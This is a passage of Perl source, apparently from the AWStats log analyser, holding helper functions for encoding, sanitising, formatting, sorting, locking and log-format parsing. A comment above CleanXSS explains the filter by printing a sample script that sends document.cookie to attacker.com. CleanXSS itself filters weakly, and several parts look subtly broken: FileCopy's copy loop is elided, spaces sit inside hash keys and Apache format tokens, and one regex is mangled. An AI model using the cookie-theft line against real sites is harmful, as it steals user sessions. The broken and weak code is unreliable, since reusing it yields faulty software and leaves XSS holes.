    foreach my $pluginname (keys %{$PluginsLoaded{'SectionInitHashArray'}}){
        # my $function="SectionInitHashArray_$pluginname()";
        # eval("$function");
        my $function = "SectionInitHashArray_$pluginname";
        &$function();
    }
 }

#------------------------------------------------------------------------------
# Function:     Change word separators of a keyphrase string into space and
#               remove bad coded chars
# Parameters:    stringtodecode
# Input:        None
# Output:       None
# Return:        decodedstring
#------------------------------------------------------------------------------
sub ChangeWordSeparatorsIntoSpace
{
    $_[0] =~ s/%0[ad]/ /ig;          # LF CR
    $_[0] =~ s/%2[02789abc]/ /ig;    # space " ' () * + ,
    $_[0] =~ s/%3a/ /ig;             # :
    $_[0] =~ tr/\+\'\(\)\"\*,:/        /s; # "&" and "=" must not be in this list
 }

#------------------------------------------------------------------------------
# Function:        Transforms special chars by entities as needed in XML/XHTML
# Parameters:    stringtoencode
# Return:        encodedstring
#------------------------------------------------------------------------------
sub XMLEncode
{
    if($BuildReportFormat ne 'xhtml' && $BuildReportFormat ne 'xml'){
        return shift;
    }
    my $string = shift;
    $string =~ s/&/&amp;/g;
    $string =~ s/</&lt;/g;
    $string =~ s/>/&gt;/g;
    $string =~ s/\"/&quot;/g;
    $string =~ s/\'/&apos;/g;
    return $string;
 }

#------------------------------------------------------------------------------
# Function:        Transforms spaces into %20 and special chars by HTML entities as needed in XML/XHTML
#                Decoding is done by XMLDecodeFromHisto.
#                AWStats data files are stored in ISO-8859-1.
# Parameters:    stringtoencode
# Return:        encodedstring
#------------------------------------------------------------------------------
sub XMLEncodeForHisto
{
    my $string = shift;
    $string =~ s/\s/%20/g;
    if($BuildHistoryFormat ne 'xml'){
        return $string;
    }
    $string =~ s/=/%3d/g;
    $string =~ s/&/&amp;/g;
    $string =~ s/</&lt;/g;
    $string =~ s/>/&gt;/g;
    $string =~ s/\"/&quot;/g;
    $string =~ s/\'/&apos;/g;
    return $string;
 }

#------------------------------------------------------------------------------
# Function:     Encode an ISO string to PageCode output
# Parameters:    stringtoencode
# Return:        encodedstring
#------------------------------------------------------------------------------
sub EncodeToPageCode
{
    my $string = shift;
    if($PageCode eq 'utf-8'){
        $string = encode("utf8", $string);
    }
    return $string;
 }

#------------------------------------------------------------------------------
# Function:     Encode a binary string into an ASCII string
# Parameters:    stringtoencode
# Return:        encodedstring
#------------------------------------------------------------------------------
sub EncodeString
{
    # use bytes;
    my $string = shift;
    $string =~ s/([\x2B\x80-\xFF])/sprintf ("%%%2x", ord($1))/eg;

    # no bytes;
    $string =~ tr/ /+/s;
    return $string;
 }

#------------------------------------------------------------------------------
# Function:     Decode an url encoded text string into a binary string
# Parameters:   stringtodecode
# Input:        None
# Output:       None
# Return:       decodedstring
#------------------------------------------------------------------------------
sub DecodeEncodedString
{
    my $stringtodecode = shift;
    $stringtodecode =~ tr/\+/ /s;
    $stringtodecode =~ s/%([A-F0-9][A-F0-9])/pack("C", hex($1))/ieg;
    $stringtodecode =~ s/["']//g;

    return $stringtodecode;
 }

#------------------------------------------------------------------------------
# Function:     Decode an precompiled regex value to a common regex value
# Parameters:   compiledregextodecode
# Input:        None
# Output:       None
# Return:        standardregex
#------------------------------------------------------------------------------
sub UnCompileRegex
{
    #shift =~ /\(\?[-\w]*:(.*)\)/;
    shift =~ /\(*:(.*)\)/;
    return $1;
 }

#------------------------------------------------------------------------------
# Function:     Clean a string of all chars that are not char or _ - \ / . \s
# Parameters:   stringtoclean, full
# Input:        None
# Output:       None
# Return:        cleanedstring
#------------------------------------------------------------------------------
sub Sanitize
{
    my $stringtoclean = shift;
    my $full = shift || 0;
    if($full){
        $stringtoclean =~ s/[^\w\d]//g;
    }else{
        $stringtoclean =~ s/[^\w\d\-\\\/\.:\s]//g;
    }
    return $stringtoclean;
 }

#------------------------------------------------------------------------------
# Function:     Clean a string of HTML tags to avoid 'Cross Site Scripting attacks'
#               and clean | char.
#                A XSS attack is providing an AWStats url with XSS code that is executed
#                when page loaded by awstats CGI is loaded from AWStats server. Such a code
#                can be<script>document.write("<img src=http://attacker.com/page.php?" + document.cookie)</script>
#                This make the browser sending a request to the attacker server that contains
#                cookie used for AWStats server sessions. Attacker can this way caught this
#                cookie and used it to go on AWStats server like original visitor. For this
#                resaon, parameter received by AWStats must be sanitized by this function
#                before beeing put inside a web page.
# Parameters:   stringtoclean
# Input:        None
# Output:       None
# Return:        cleanedstring
#------------------------------------------------------------------------------
sub CleanXSS
{
    my $stringtoclean = shift;
    # To avoid html tags and javascript
    $stringtoclean =~ s/</&lt;/g;
    $stringtoclean =~ s/>/&gt;/g;
    $stringtoclean =~ s/|//g;

    # To avoid onload="
    $stringtoclean =~ s/onload//g;
    return $stringtoclean;
 }

#------------------------------------------------------------------------------
# Function:     Clean tags in a string
#                AWStats data files are stored in ISO-8859-1.
# Parameters:   stringtodecode
# Input:        None
# Output:       None
# Return:        decodedstring
#------------------------------------------------------------------------------
sub XMLDecodeFromHisto
{
    my $stringtoclean = shift;
    $stringtoclean =~ s/$regclean1/ /g;    # Replace <recnb> or </td> with space
    $stringtoclean =~ s/$regclean2//g;     # Remove others <xxx>
    $stringtoclean =~ s/%3d/=/g;
    $stringtoclean =~ s/&amp;/&/g;
    $stringtoclean =~ s/&lt;/</g;
    $stringtoclean =~ s/&gt;/>/g;
    $stringtoclean =~ s/&quot;/\"/g;
    $stringtoclean =~ s/&apos;/\'/g;
    return $stringtoclean;
 }

#------------------------------------------------------------------------------
# Function:     Copy one file into another
# Parameters:   sourcefilename targetfilename
# Input:        None
# Output:       None
# Return:        0 if copy is ok, 1 else
#------------------------------------------------------------------------------
sub FileCopy
{
    my $filesource = shift;
    my $filetarget = shift;
    open(FILESOURCE, "$filesource")  || return 1;
    open(FILETARGET, ">$filetarget") || return 1;
    binmode FILESOURCE;
    binmode FILETARGET;

    # ...
    close(FILETARGET);
    close(FILESOURCE);
    return 0;
 }

#------------------------------------------------------------------------------
# Function:     Format a QUERY_STRING
# Parameters:   query
# Input:        None
# Output:       None
# Return:        formated query
#------------------------------------------------------------------------------
# TODO Appeller cette fonction partout ou il y a des NewLinkParams
sub CleanNewLinkParamsFrom
{
    my $NewLinkParams = shift;
    while(my $param = shift){
        $NewLinkParams =~ s/(^|&|&amp;)$param(=[^&]*|$)//i;
    }
    $NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
    $NewLinkParams =~ s/^&amp;//;
    $NewLinkParams =~ s/&amp;$//;
    return $NewLinkParams;
 }

#------------------------------------------------------------------------------
# Function:     Show flags for other language translations
# Parameters:   Current languade id (en, fr, ...)
# Input:        None
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub Show_Flag_Links
{
    my $CurrentLang = shift;

    # Build flags link
    my $NewLinkParams = $QueryString;
    my $NewLinkTarget = '';
    if($ENV{'GATEWAY_INTERFACE'}){
        $NewLinkParams = CleanNewLinkParamsFrom($NewLinkParams, 
            ('update', 'staticlinks', 'framename', 'lang'));
        $NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
        $NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
        $NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
        $NewLinkParams =~ s/(^|&|&amp;)lang=[^&]*//i;
        $NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
        $NewLinkParams =~ s/^&amp;//;
        $NewLinkParams =~ s/&amp;$//;
        if($NewLinkParams){
            $NewLinkParams = "${NewLinkParams }&amp;";
        }
        if($FrameName eq 'mainright'){
            $NewLinkTarget = " target=\"_parent\"";
        }
    }else{
        $NewLinkParams =($SiteConfig ? "config=$SiteConfig&amp;" : "") .
            "year=$YearRequired&amp;month=$MonthRequired&amp;";
    }
    if($NewLinkParams !~ /output=/){
        $NewLinkParams .= 'output=main&amp;';
    }
    if($FrameName eq 'mainright'){
        $NewLinkParams .= 'framename=index&amp;';
    }

    foreach my $lng (split(/\s+/, $ShowFlagLinks)){
        $lng = $LangBrowserToLangAwstats{$lng} ? 
            $LangBrowserToLangAwstats{$lng} : $lng;
        if($lng ne $CurrentLang){
            my %lngtitle = ('en', 'English', 'fr', 'French', 'de', 'German',
                            'it', 'Italian', 'nl', 'Dutch',  'es', 'Spanish');
            my $lngtitle = ($lngtitle{$lng} ? $lngtitle{$lng} : $lng);
            my $flag = ($LangAWStatsToFlagAwstats{$lng} ?
                   $LangAWStatsToFlagAwstats{$lng} : $lng);
            print "<a href=\"" . XMLEncode("$AWScript${NewLinkParams }lang=$lng") .
                  "\"$NewLinkTarget><img src=\"$DirIcons\/flags\/$flag.png\" ".
                  "height=\"14\" border=\"0\"" . AltTitle("$lngtitle") . " /></a>&nbsp;\n";
        }
    }
 }

#------------------------------------------------------------------------------
# Function:        Format value in bytes in a string (Bytes, Kb, Mb, Gb)
# Parameters:   bytes (integer value or "0.00")
# Input:        None
# Output:       None
# Return:       "x.yz MB" or "x.yy KB" or "x Bytes" or "0"
#------------------------------------------------------------------------------
sub Format_Bytes {
    my $bytes = shift || 0;
    my $fudge = 1;

    # Do not use exp/log function to calculate 1024power, 
    # function make segfault on some unix/perl versions
    if($bytes >= ($fudge << 30)){
        return sprintf("%.2f", $bytes / 1073741824) . " $Message[110]";
    }
    if($bytes >= ($fudge << 20)){
        return sprintf("%.2f", $bytes / 1048576) . " $Message[109]";
    }
    if($bytes >= ($fudge << 10)){
        return sprintf("%.2f", $bytes / 1024) . " $Message[108]";
    }
    if($bytes < 0){ $bytes = "?"; }
    return int($bytes) . (int($bytes) ? " $Message[119]" : "");
 }

#------------------------------------------------------------------------------
# Function:        Format a number with commas or any other separator
#                CL: courtesy of http://www.perlmonks.org/?node_id=2145
# Parameters:   number
# Input:        None
# Output:       None
# Return:       "999,999,999,999"
#------------------------------------------------------------------------------
sub Format_Number
{
    my $number = shift || 0;
    $number =~ s/(\d)(\d\d\d)$/$1 $2/;
    $number =~ s/(\d)(\d\d\d\s\d\d\d)$/$1 $2/;
    $number =~ s/(\d)(\d\d\d\s\d\d\d\s\d\d\d)$/$1 $2/;
    my $separator = $Message[177];
    if($separator eq ''){ $separator=' '; } # For backward compatibility
    $number =~ s/ /$separator/g;
    return $number;
 }

#------------------------------------------------------------------------------
# Function:        Return " alt=string title=string"
# Parameters:   string
# Input:        None
# Output:       None
# Return:       "alt=string title=string"
#------------------------------------------------------------------------------
sub AltTitle {
    my $string = shift || '';
    return " alt='$string' title='$string'";

    #    return " alt=\"$string\" title=\"$string\"";
    #    return ($BuildReportFormat?"":" alt=\"$string\"")." title=\"$string\"";
 }

#------------------------------------------------------------------------------
# Function:        Tell if an email is a local or external email
# Parameters:   email
# Input:        $SiteDomain(exact string) $HostAliases(quoted regex string)
# Output:       None
# Return:       -1, 0 or 1
#------------------------------------------------------------------------------
sub IsLocalEMail
{
    my $email = shift || 'unknown';
    if($email !~ /\@(.*)$/){ return 0; }
    my $domain = $1;
    if($domain =~ /^$SiteDomain$/i){ return 1; }
    foreach (@HostAliases) {
        if($domain =~ /$_/){ return 1; }
    }
    return -1;
 }

#------------------------------------------------------------------------------
# Function:        Format a date according to Message[78] (country date format)
# Parameters:   String date YYYYMMDDHHMMSS
#               Option 0=LastUpdate and LastTime date
#                      1=Arrays date except daymonthvalues
#                      2=daymonthvalues date (only year month and day)
# Input:        $Message[78]
# Output:       None
# Return:       Date with format defined by Message[78] and option
#------------------------------------------------------------------------------
sub Format_Date
{
    my $date       = shift;
    my $option     = shift || 0;
    my $year       = substr("$date", 0, 4);
    my $month      = substr("$date", 4, 2);
    my $day        = substr("$date", 6, 2);
    my $hour       = substr("$date", 8, 2);
    my $min        = substr("$date", 10, 2);
    my $sec        = substr("$date", 12, 2);
    my $dateformat = $Message[78];

    if($option == 2){
        $dateformat =~ s/^[^ymd]+//g;
        $dateformat =~ s/[^ymd]+$//g;
    }
    $dateformat =~ s/yyyy/$year/g;
    $dateformat =~ s/yy/$year/g;
    $dateformat =~ s/mmm/$MonthNumLib{$month }/g;
    $dateformat =~ s/mm/$month/g;
    $dateformat =~ s/dd/$day/g;
    $dateformat =~ s/HH/$hour/g;
    $dateformat =~ s/MM/$min/g;
    $dateformat =~ s/SS/$sec/g;
    return "$dateformat";
 }

#------------------------------------------------------------------------------
# Function:     Return 1 if string contains only ascii chars
# Parameters:   string
# Input:        None
# Output:       None
# Return:       0 or 1
#------------------------------------------------------------------------------
sub IsAscii
{
    my $string = shift;
    if($string =~ /^[\w\+\-\/\\\.%,;:=\"\'&?!\s]+$/){
        # Only alphanum chars (and _) or + - / \ . % , ; : = " ' & ? space \t
        return 1;
    }
    return 0;
 }

#------------------------------------------------------------------------------
# Function:     Return the lower value between 2 but exclude value if 0
# Parameters:   Val1 and Val2
# Input:        None
# Output:       None
# Return:       min(Val1,Val2)
#------------------------------------------------------------------------------
sub MinimumButNoZero {
    my ($val1, $val2) = @_;
    return ($val1 && ($val1 < $val2 || !$val2) ? $val1 : $val2);
 }

#------------------------------------------------------------------------------
# Function:     Add a val from sorting tree
# Parameters:   keytoadd keyval [firstadd]
# Input:        None
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub AddInTree
{
    my $keytoadd = shift;
    my $keyval   = shift;
    my $firstadd = shift || 0;
    if($firstadd == 1){ # Val is the first one
        $val{$keyval} = $keytoadd;
        $lowerval = $keyval;
        return;
    }
    if($val{$keyval}){ # Val is already in tree
        $egal{$keytoadd} = $val{$keyval};
        $val{$keyval}    = $keytoadd;
        return;
    }
    if($keyval <= $lowerval){
        # Val is a new one lower (should happens only when tree is not full)
        $val{$keyval}     = $keytoadd;
        $nextval{$keyval} = $lowerval;
        $lowerval         = $keyval;
        return;
    }

    # Val is a new one higher
    $val{$keyval} = $keytoadd;
    my $valcursor = $lowerval; # valcursor is value just before keyval
    while($nextval{$valcursor} && ($nextval{$valcursor} < $keyval)){
        $valcursor = $nextval{$valcursor};
    }
    if($nextval{$valcursor}){ # keyval is between valcursor and nextval{valcursor}
        $nextval{$keyval} = $nextval{$valcursor};
    }
    $nextval{$valcursor} = $keyval;
 }

#------------------------------------------------------------------------------
# Function:     Remove a val from sorting tree
# Parameters:   None
# Input:        $lowerval %val %egal
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub Removelowerval
{
    my $keytoremove = $val{$lowerval }; # This is lower key
    if($egal{$keytoremove}){
        $val{$lowerval} = $egal{$keytoremove};
        delete $egal{$keytoremove};
    }else{
        delete $val{$lowerval};
        $lowerval = $nextval{$lowerval}; # Set new lowerval
    }
 }

#------------------------------------------------------------------------------
# Function:     Build @keylist array
# Parameters:   Size max for @keylist array,
#               Min value in hash for select,
#               Hash used for select,
#               Hash used for order
# Input:        None
# Output:       None
# Return:       @keylist response array
#------------------------------------------------------------------------------
sub BuildKeyList
{
    my $ArraySize = shift || error("System error. Call to BuildKeyList function ".
                        "with incorrect value for first param", "", "", 1);
    my $MinValue = shift || error("System error. Call to BuildKeyList function ".
                        "with incorrect value for second param", "", "", 1);
    my $hashforselect = shift;
    my $hashfororder  = shift;

    # Those is to protect from infinite loop when hash array has an incorrect null key
    # Global because used in AddInTree and Removelowerval
    delete $hashforselect->{0};
    delete $hashforselect->{''}; 
    my $count = 0;
    $lowerval = 0;    
    %val      = ();
    %nextval  = ();
    %egal     = ();

    foreach my $key (keys %$hashforselect){
        if($count < $ArraySize){
            if($hashforselect->{$key } >= $MinValue){
                $count++;
                AddInTree($key, $hashfororder->{$key } || 0, $count);
            }
            next;
        }
        $count++;
        if(($hashfororder->{$key } || 0) <= $lowerval){
            next;
        }
        AddInTree($key, $hashfororder->{$key } || 0);
        Removelowerval();
    }

    # Build key list and sort it
    my %notsortedkeylist = ();
    foreach my $key (values %val){
        $notsortedkeylist{$key } = 1;
    }
    foreach my $key (values %egal){
        $notsortedkeylist{$key } = 1;
    }
    @keylist = ();
    @keylist = (sort {($hashfororder->{$b} || 0) <=> ($hashfororder->{$a} || 0)} keys %notsortedkeylist);
    return;
 }

#------------------------------------------------------------------------------
# Function:     Lock or unlock update
# Parameters:   status (1 to lock, 0 to unlock)
# Input:        $DirLock (if status=0) $PROG $FileSuffix
# Output:       $DirLock (if status=1)
# Return:       None
#------------------------------------------------------------------------------
sub Lock_Update
{
    my $status = shift;
    my $lock   = "$PROG$FileSuffix.lock";
    if($status){
        # We stop if there is at least one lock file wherever it is
        foreach my $key ($ENV{"TEMP" }, $ENV{"TMP" }, "/tmp", "/", "."){
            my $newkey = $key;
            $newkey =~ s/[\\\/]$//;
            if(-f "$newkey/$lock"){
                error("An AWStats update process seems to be already running for this config file. ".
                      "Try later.\nIf this is not true, remove manually lock file '$newkey/$lock'.","", "", 1);
            }
        }

        # Set lock where we can
        foreach my $key ($ENV{"TEMP" }, $ENV{"TMP" }, "/tmp", "/", "."){
            if(!-d "$key"){
                next;
            }
            $DirLock = $key;
            $DirLock =~ s/[\\\/]$//;
            open(LOCK, ">$DirLock/$lock") || error("Failed to create lock file $DirLock/$lock", "", "",1);
            print LOCK "AWStats update started by process $$ at $nowyear-$nowmonth-$nowday $nowhour:$nowmin:$nowsec\n";
            close(LOCK);
            last;
        }
    }else{
        # Remove lock
        unlink("$DirLock/$lock");
    }
    return;
 }

#------------------------------------------------------------------------------
# Function:     Signal handler to call Lock_Update to remove lock file
# Parameters:   Signal name
# Input:        None
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub SigHandler {
    my $signame = shift;
    print ucfirst($PROG) . " process (ID $$) interrupted by signal $signame.\n";
    &Lock_Update(0);
    exit 1;
 }

#------------------------------------------------------------------------------
# Function:     Convert an IPAddress into an integer
# Parameters:   IPAddress
# Input:        None
# Output:       None
# Return:       Int
#------------------------------------------------------------------------------
sub Convert_IP_To_Decimal {
    my ($IPAddress) = @_;
    my @ip_seg_arr = split(/\./, $IPAddress);
    my $decimal_ip_address =
      256 * 256 * 256 * $ip_seg_arr[0] + 256 * 256 * $ip_seg_arr[1] + 256 *
      $ip_seg_arr[2] + $ip_seg_arr[3];
    return ($decimal_ip_address);
 }

#------------------------------------------------------------------------------
# Function:     Test there is at least one value in list not null
# Parameters:   List of values
# Input:        None
# Output:       None
# Return:       1 There is at least one not null value, 0 else
#------------------------------------------------------------------------------
sub AtLeastOneNotNull
{
    foreach my $val (@_) {
        if($val){return 1; }
    }
    return 0;
 }

#------------------------------------------------------------------------------
# Function:     Prints the command line interface help information
# Parameters:   None
# Input:        None
# Output:       None
# Return:       None
#------------------------------------------------------------------------------
sub PrintCLIHelp {
    print "----- $PROG $VERSION (c) 2000-2010 Laurent Destailleur -----\n";
    print "Syntax: $PROG.$Extension -update -config=virtualhostname [options]\\nn";
    print "Now supports/detects:\n";
    print "  Web/Ftp/Mail/streaming server log analyzis (and load balanced log files)\n";
    print "  Reverse DNS lookup (IPv4 and IPv6) and GeoIP lookup\n";
    print "  Number of visits, number of unique visitors\n";
    print "  Visits duration and list of last visits\n";
    print "  Authenticated users\n";
    print "  Days of week and rush hours\n";
    print "  Hosts list and unresolved IP addresses list\n";
    print "  Most viewed, entry and exit pages\n";
    print "  Files type and Web compression (mod_gzip, mod_deflate stats)\n";
    print "  Screen size\n";
    print "  Ratio of Browsers with support of: Java, Flash, RealG2 reader,\n";
    print "  Quicktime reader, WMA reader, PDF reader\n";
    print "  Configurable personalized reports\n";
    print "  domains/countries\n";
    print "  robots\n";
    print "  worm's families\n";
    print "  operating systems\n";
    print "  browsers";
    print "  with phone browsers database)\n";
    print "  search engines (and keyphrases/keywords used from them)\n";
    print "  All HTTP errors with last referrer\n";
    print "  Report by day/month/year\n";
    print "New versions and FAQ at http://awstats.sourceforge.net\n";
 }

#------------------------------------------------------------------------------
# Function:     Define value for PerlParsingFormat (used for regex log record parsing)
# Parameters:   $LogFormat
# Input:        -
# Output:       $pos_xxx, @pos_extra, @fieldlib, $PerlParsingFormat
# Return:       -
#------------------------------------------------------------------------------
sub DefinePerlParsingFormat
{
    my $LogFormat = shift;
    $pos_vh = $pos_host = $pos_date = -1;
    $pos_tz = $pos_url  = $pos_code = -1;
    $pos_logname   = $pos_method  = $pos_size   = -1;
    $pos_referer   = $pos_agent   = $pos_query  = -1;
    $pos_gzipin    = $pos_gzipout = $pos_hostr  = -1;
    $pos_cluster   = $pos_emails  = $pos_emailr = -1;
    $pos_compratio = $pos_httpx   = $pos_web    = -1;
    @pos_extra  = @fieldlib = ();
    $PerlParsingFormat = '';

# Log records examples:
# Apache combined:             62.161.78.73 user - [dd/mmm/yyyy:hh:mm:ss +0000] "GET / HTTP/1.1" 200 1234 "http://www.from.com/from.htm" "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
# Apache combined (408 error): my.domain.com - user [09/Jan/2001:11:38:51 -0600] "OPTIONS /mime-tmp/xxx file.doc HTTP/1.1" 408 - "-" "-"
# Apache combined (408 error): 62.161.78.73 user - [dd/mmm/yyyy:hh:mm:ss +0000] "-" 408 - "-" "-"
# Apache combined (400 error): 80.8.55.11 - - [28/Apr/2007:03:20:02 +0200] "GET /" 400 584 "-" "-"
# IIS:                         2000-07-19 14:14:14 62.161.78.73 - GET / 200 1234 HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+5.01;+Windows+NT+5.0) http://www.from.com/from.htm
# WebStar:                     05/21/00    00:17:31    OK      200    212.242.30.6    Mozilla/4.0 (compatible; MSIE 5.0; Windows 98; DigExt)    http://www.cover.dk/    "www.cover.dk"    :Documentation:graphics:starninelogo.white.gif    1133
# Squid extended:              12.229.91.170 - - [27/Jun/2002:03:30:50 -0700] "GET http://www.callistocms.com/images/printable.gif HTTP/1.1" 304 354 "-" "Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0" TCP_REFRESH_HIT:DIRECT
# Log formats:
# Apache common_with_mod_gzip_info1: %h %l %u %t \"%r\" %>s %b mod_gzip: %{mod_gzip_compression_ratio }npct.
# Apache common_with_mod_gzip_info2: %h %l %u %t \"%r\" %>s %b mod_gzip: %{mod_gzip_result }n In:%{mod_gzip_input_size }n Out:%{mod_gzip_output_size }n:%{mod_gzip_compression_ratio }npct.
# Apache deflate: %h %l %u %t \"%r\" %>s %b \"%{Referer }i\" \"%{User-Agent }i\" (%{ratio }n)

    if($LogFormat =~ /^[1-6]$/){ # Pre-defined log format
        if($LogFormat eq '1' || $LogFormat eq '6'){
            # Same than "%h %l %u %t \"%r\" %>s %b \"%{Referer }i\" \"%{User-Agent }i\"".
            # %u (user) is "([^\\/\\[]+)" instead of "[^ ]+" because can contain space 
            # (Lotus Notes). referer and ua might be "".
            # $PerlParsingFormat="([^ ]+) [^ ]+ ([^\\/\\[]+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) 
            # (.+) [^\\\"]+\\\" ([\\d|-]+) ([\\d|-]+) \\\"(.*?)\\\" \\\"([^\\\"]*)\\\"";
            $PerlParsingFormat = "([^ ]+) [^ ]+ ([^\\/\\[]+) \\[([^ ]+) [^ ]+\\] ".
                                 "\\\"([^ ]+) ([^ ]+)(?: [^\\\"]+|)\\\" ([\\d|-]+) ".
                                 "([\\d|-]+) \\\"(.*?)\\\" \\\"([^\\\"]*)\\\" ".
                                 "\\\"(.*?)\\\" \\\"(.*?)\\\"";
            $pos_host    = 0;
            $pos_logname = 1;
            $pos_date    = 2;
            $pos_method  = 3;
            $pos_url     = 4;
            $pos_code    = 5;
            $pos_size    = 6;
            $pos_referer = 7;
            $pos_agent   = 8;
            $pos_httpx   = 9;
            $pos_web     = 10;
            @fieldlib    = ('host', 'logname', 'date', 'method', 'url', 
                            'code', 'size', 'referer', 'ua', 'httpx', 'web');
        }elsif($LogFormat eq '2'){
            # Same than "date time c-ip cs-username cs-method cs-uri-stem 
            # sc-status sc-bytes cs-version cs(User-Agent) cs(Referer)"
            $PerlParsingFormat = "(\\S+ \\S+) (\\S+) (\\S+) (\\S+) (\\S+) ".
                                 "([\\d|-]+) ([\\d|-]+) \\S+ (\\S+) (\\S+)";
            $pos_date    = 0;
            $pos_host    = 1;
            $pos_logname = 2;
            $pos_method  = 3;
            $pos_url     = 4;
            $pos_code    = 5;
            $pos_size    = 6;
            $pos_agent   = 7;
            $pos_referer = 8;
            @fieldlib    = ('date', 'host', 'logname', 'method', 'url', 'code', 'size', 'ua',   'referer');
        }elsif($LogFormat eq '3'){
            $PerlParsingFormat = "([^\\t]*\\t[^\\t]*)\\t([^\\t]*)\\t([\\d|-]*)\\t([^\\t]*)\\t".
                                 "([^\\t]*)\\t([^\\t]*)\\t[^\\t]*\\t([^\\t]*)\\t([\\d]*)";
            $pos_date    = 0;
            $pos_method  = 1;
            $pos_code    = 2;
            $pos_host    = 3;
            $pos_agent   = 4;
            $pos_referer = 5;
            $pos_url     = 6;
            $pos_size    = 7;
            @fieldlib    = ('date', 'method',  'code', 'host', 'ua',   'referer', 'url',  'size');
        }elsif($LogFormat eq '4'){
            # Same than "%h %l %u %t \"%r\" %>s %b"
            # %u (user) is "(.+)" instead of "[^ ]+" because can contain space (Lotus Notes).
            $PerlParsingFormat = "([^ ]+) [^ ]+ (.+) \\[([^ ]+) [^ ]+\\] \\\"([^ ]+) ".
                                 "([^ ]+)(?: [^\\\"]+|)\\\" ([\\d|-]+) ([\\d|-]+)";
            $pos_host    = 0;
            $pos_logname = 1;
            $pos_date    = 2;
            $pos_method  = 3;
            $pos_url     = 4;
            $pos_code    = 5;
            $pos_size    = 6;
            @fieldlib    = ('host', 'logname', 'date', 'method', 'url', 'code', 'size');
        }
    }else {
        # Personalized log format
        # Replacement for Notes format string that are not Apache
        # Replacement for Apache format string
        my $LogFormatString = $LogFormat;
        $LogFormatString =~ s/%vh/%virtualname/g;
        $LogFormatString =~ s/%v(\s)/%virtualname$1/g;
        $LogFormatString =~ s/%v$/%virtualname/g;
        $LogFormatString =~ s/%h(\s)/%host$1/g;
        $LogFormatString =~ s/%h$/%host/g;
        $LogFormatString =~ s/%l(\s)/%other$1/g;
        $LogFormatString =~ s/%l$/%other/g;
        $LogFormatString =~ s/\"%u\"/%lognamequot/g;
        $LogFormatString =~ s/%u(\s)/%logname$1/g;
        $LogFormatString =~ s/%u$/%logname/g;
        $LogFormatString =~ s/%t(\s)/%time1$1/g;
        $LogFormatString =~ s/%t$/%time1/g;
        $LogFormatString =~ s/\"%r\"/%methodurl/g;
        $LogFormatString =~ s/%>s/%code/g;
        $LogFormatString =~ s/%b(\s)/%bytesd$1/g;
        $LogFormatString =~ s/%b$/%bytesd/g;
        $LogFormatString =~ s/\"%{Referer }i\"/%refererquot/g;
        $LogFormatString =~ s/\"%{User-Agent }i\"/%uaquot/g;
        $LogFormatString =~ s/%{mod_gzip_input_size }n/%gzipin/g;
        $LogFormatString =~ s/%{mod_gzip_output_size }n/%gzipout/g;
        $LogFormatString =~ s/%{mod_gzip_compression_ratio }n/%gzipratio/g;
        $LogFormatString =~ s/\(%{ratio }n\)/%deflateratio/g;

        # Replacement for a IIS and ISA format string
        $LogFormatString =~ s/cs-uri-query/%query/g;    # Must be before cs-uri
        $LogFormatString =~ s/date\stime/%time2/g;
        $LogFormatString =~ s/c-ip/%host/g;
        $LogFormatString =~ s/cs-username/%logname/g;
        $LogFormatString =~ s/cs-method/%method/g;  # GET, POST, SMTP, RETR STOR
        $LogFormatString =~ s/cs-uri-stem/%url/g;
        $LogFormatString =~ s/cs-uri/%url/g;
        $LogFormatString =~ s/sc-status/%code/g;
        $LogFormatString =~ s/sc-bytes/%bytesd/g;
        $LogFormatString =~ s/cs-version/%other/g;  # Protocol
        $LogFormatString =~ s/cs\(User-Agent\)/%ua/g;
        $LogFormatString =~ s/c-agent/%ua/g;
        $LogFormatString =~ s/cs\(Referer\)/%referer/g;
        $LogFormatString =~ s/cs-referred/%referer/g;
        $LogFormatString =~ s/sc-authenticated/%other/g;
        $LogFormatString =~ s/s-svcname/%other/g;
        $LogFormatString =~ s/s-computername/%other/g;
        $LogFormatString =~ s/r-host/%virtualname/g;
        $LogFormatString =~ s/cs-host/%virtualname/g;
        $LogFormatString =~ s/r-ip/%other/g;
        $LogFormatString =~ s/r-port/%other/g;
        $LogFormatString =~ s/time-taken/%other/g;
        $LogFormatString =~ s/cs-bytes/%other/g;
        $LogFormatString =~ s/cs-protocol/%other/g;
        $LogFormatString =~ s/cs-transport/%other/g;
        
        # GET, POST, SMTP, RETR STOR
        $LogFormatString =~ s/s-operation/%method/g;
        $LogFormatString =~ s/cs-mime-type/%other/g;
        $LogFormatString =~ s/s-object-source/%other/g;
        $LogFormatString =~ s/s-cache-info/%other/g;
        $LogFormatString =~ s/cluster-node/%cluster/g;
        $LogFormatString =~ s/s-sitename/%other/g;
        $LogFormatString =~ s/s-ip/%other/g;
        $LogFormatString =~ s/s-port/%other/g;
        $LogFormatString =~ s/cs\(Cookie\)/%other/g;
        $LogFormatString =~ s/sc-substatus/%other/g;
        $LogFormatString =~ s/sc-win32-status/%other/g;

        # Added for MMS
        # cs-method might not be available
        # c-status used when sc-status not available
        $LogFormatString =~ s/protocol/%protocolmms/g;
        $LogFormatString =~ s/c-status/%codemms/g;

        # $LogFormatString has an AWStats format, 
        # so we can generate PerlParsingFormat variable
        my $i = 0;
        my $LogSeparatorWithoutStar = $LogSeparator;
        $LogSeparatorWithoutStar    =~ s/[\*\+]//g;
        foreach my $f (split(/\s+/, $LogFormatString)){
            # Add separator for next field
            if($PerlParsingFormat){
                $PerlParsingFormat .= "$LogSeparator";
            }
            # Special for logname
            if($f =~ /%lognamequot$/){
                $pos_logname = $i;
                $i++;
                push @fieldlib, 'logname';
                # logname can be "value", "" and - in same log (Lotus notes)
                $PerlParsingFormat .= "\\\"?([^\\\"]*)\\\"?";
            }elsif($f =~ /%logname$/){
                $pos_logname = $i;
                $i++;
                push @fieldlib, 'logname';
